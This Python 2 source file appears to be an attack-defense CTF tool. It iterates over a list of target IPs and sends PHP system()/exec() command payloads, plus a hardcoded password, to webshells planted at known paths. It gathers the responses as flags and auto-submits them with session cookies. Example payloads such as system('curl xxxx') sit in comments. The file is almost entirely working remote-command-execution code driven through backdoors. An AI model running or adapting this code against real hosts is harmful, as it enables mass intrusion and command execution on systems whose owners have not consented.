# -*- coding: utf-8 -*-

import requests
from core.shells import *
#from core.ip_list import *

#GET_eval_shells_path_pwd = {}
#POST_eval_shells_path_pwd = {}
#GET_exec_shells_path_pwd = {}
#POST_exec_shells_path_pwd = {}

flags = []
cookies = ''
datas = ''
url = ''
command = ''
# Example:POST_data={'x':"system('curl xxxx');"}
# POST_file = "system('curl xxxx');"

# Example:GET_data="echo exec('curl xxxx');"
#eval_file = "echo exec('curl xxxx');"
#exec_file = "curl xxxx"

#global GET_eval_shells_path_pwd,POST_eval_shells_path_pwd,GET_exec_shells_path_pwd,POST_exec_shells_path_pwd

# 设置获取flag的命令
def set_command(command):
    cmd = "'" + command + "'"
    global POST_file,eval_file,exec_file
    eval_file = """system(%s);""" % cmd
    print eval_file
    # eval_file="echo exec(%s);"%cmd
    exec_file = command


# 判断获取flag是否成功
def judege(url,flag):
    global flags
    text=flag.text
    if flag.status_code == 200 and str(text)!='':
        flags.append(flag.text)
        #target.write(flag.text)
        print url+ " got flag!"
    else:
        print url + " got flag failed!"


# 遍历ip列表获取flag
def get_flag():
    #global GET_eval_shells_path_pwd,POST_eval_shells_path_pwd,GET_exec_shells_path_pwd,POST_exec_shells_path_pwd
    GET_eval_shells_path_pwd=Get_GET_eval_sap()
    POST_eval_shells_path_pwd=Get_Post_eval_sap()
    GET_exec_shells_path_pwd=Get_GET_exec_sap()
    POST_exec_shells_path_pwd=Get_POST_exec_sap()
    print GET_eval_shells_path_pwd,POST_eval_shells_path_pwd,GET_exec_shells_path_pwd,POST_exec_shells_path_pwd
    global ipList
    print 'this'
    #global target
    #target = open('auxi/flags.txt','w')
    for i in ipList:
        print i

        for j in POST_eval_shells_path_pwd:
            evel_POST_data={}
            evel_POST_data['pass']='Sn3rtf4ck'
            evel_POST_data[POST_eval_shells_path_pwd[j]] =eval_file
            url = "http://" + i + j
            try:
                flag = requests.post(url,data = evel_POST_data,timeout=3)
                judege(url,flag)
            except:
                print "error!"

        for k in GET_eval_shells_path_pwd:
            url = "http://" + i + k
            print url
            try:
                if '?' in k:
                    flag = requests.get(url + '&' + GET_eval_shells_path_pwd[k] + "=" + eval_file)
                else:
                    payload = {GET_eval_shells_path_pwd[k]:eval_file}
                    flag = requests.get(url,params = payload,timeout=3)
                judege(url,flag)
            except:
                print "error"

        for m in GET_exec_shells_path_pwd:
            url = "http://" + i + m
            try:
                payload = {GET_exec_shells_path_pwd[m]:exec_file}
                flag = requests.get(url,params = payload,timeout=3)
                judege(url,flag)

            except:
                print "error"

        for n in POST_exec_shells_path_pwd:
            url = "http://" + i + n
            exec_POST_data = {POST_exec_shells_path_pwd[n]:exec_file}
            try:
                flag = requests.post(url,data = exec_POST_data,timeout=3)
                judege(url,flag)
            except:
                print "error"
    #target.close()

def show_flag():
    for i in flags:
        print i


# 提交flag
def submit_flag(url = url,cookies = cookies,datas = datas):
    global flags
    cookie = cookies.replace(' ','')
    cookie_dict = dict((line.split('=') for line in cookie.strip().split(";")))
    data = datas.replace(' ','')
    data_dict = dict((line.split('=') for line in data.strip().split("&")))
    check = "<Response [200]>"
    for j in data_dict:
        if data_dict[j] == '?':
            p = j
    for i in flags:
        data_dict[p] = i
        print i
        try:
            a = requests.post(url,data = data_dict,cookies = cookie_dict)
            if a.status_code==200:
                print "Submit flag success"
            else:
                print "submit flag failed"
        except:
            print "something is wrong ,please check!"

    print "ok,do you want to clear flag?",
    choice = raw_input("y/n")
    while choice not in ['y','n']:
        print "please input 'y/n'"
        choice = raw_input("y/n")
    if choice == 'y':
        clear_flag()


def clear_flag():
    global flags
    flags = []
